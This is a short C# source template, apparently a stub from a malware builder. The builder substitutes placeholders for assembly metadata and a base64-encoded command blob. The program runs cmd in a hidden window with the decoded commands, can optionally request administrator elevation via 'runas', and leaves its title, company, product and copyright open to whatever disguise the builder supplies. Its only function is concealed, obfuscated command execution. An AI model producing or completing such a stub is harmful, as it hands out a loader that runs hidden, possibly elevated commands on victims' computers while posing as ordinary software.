using System;
using System.IO;
using System.Text;
using System.Diagnostics;
using System.Runtime.InteropServices;
#if DefDebug
using System.Windows.Forms;
#endif
#if DefAdmin
using System.Security.Principal;
#endif
#if DefAssembly
using System.Reflection;
[assembly: AssemblyTitle("%Title%")]
[assembly: AssemblyDescription("%Description%")]
[assembly: AssemblyCompany("%Company%")]
[assembly: AssemblyProduct("%Product%")]
[assembly: AssemblyCopyright("%Copyright%")]
[assembly: AssemblyTrademark("%Trademark%")]
[assembly: AssemblyFileVersion("%v1%" + "." + "%v2%" + "." + "%v3%" + "." + "%v4%")]
#endif

[assembly: Guid("%Guid%")]

public partial class Program
{
    public static void Main()
    {

#if DefDebug
        try
        {
#endif
        Process.Start(new ProcessStartInfo
        {
            FileName = "cmd",
            Arguments = Encoding.ASCII.GetString(Convert.FromBase64String("#DATA")),
            WindowStyle = ProcessWindowStyle.Hidden,
#if DefAdmin
            Verb = "runas"
#endif
        });
#if DefDebug
        }
        catch (Exception ex)
        {
            MessageBox.Show("L1: " + Environment.NewLine + ex.ToString());
        }
#endif
    }
}